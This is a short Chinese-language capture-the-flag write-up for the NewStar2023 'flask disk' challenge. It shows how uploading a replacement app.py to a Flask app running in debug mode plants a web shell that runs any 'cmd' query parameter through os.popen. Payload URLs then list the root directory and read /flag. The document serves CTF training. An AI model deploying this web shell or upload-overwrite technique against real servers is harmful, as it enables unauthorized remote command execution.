### NewStar2023-week4---- flask disk

---

> 题目提示：a flask disk with a vulneribility. (The application is running on port 5000)

![image-20241104211308756](https://gitee.com/bx33661/image/raw/master/path/image-20241104211308756.png)

进入页面三个页面，

- 可以看到上传的文件，发现存在`app.py`
- 上传文件页面
- console页面，需要pin码

我们从了解到信息可以知道，程序运行的端口，和flask属于debug模式，可以修改app.py，重载，

*所以说这个提示有时候就是破题点*

我们上传一个可以命令执行的app.py，重载一下

```python
from flask import Flask, request
import os

app = Flask(__name__)


@app.route('/')
def index():
    try:
        cmd = request.args.get('cmd')
        data = os.popen(cmd).read()
        return data
    except:
        pass

    return "1"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

Payload：

```(空)
http://dadd7728-72ca-4181-834e-5c35b823c8bb.node5.buuoj.cn:81/?cmd=ls /
```

![image-20241104211215855](https://gitee.com/bx33661/image/raw/master/path/image-20241104211215855.png)

```(空)
http://dadd7728-72ca-4181-834e-5c35b823c8bb.node5.buuoj.cn:81/?cmd=cat /flag
```



![image-20241104211141775](https://gitee.com/bx33661/image/raw/master/path/image-20241104211141775.png)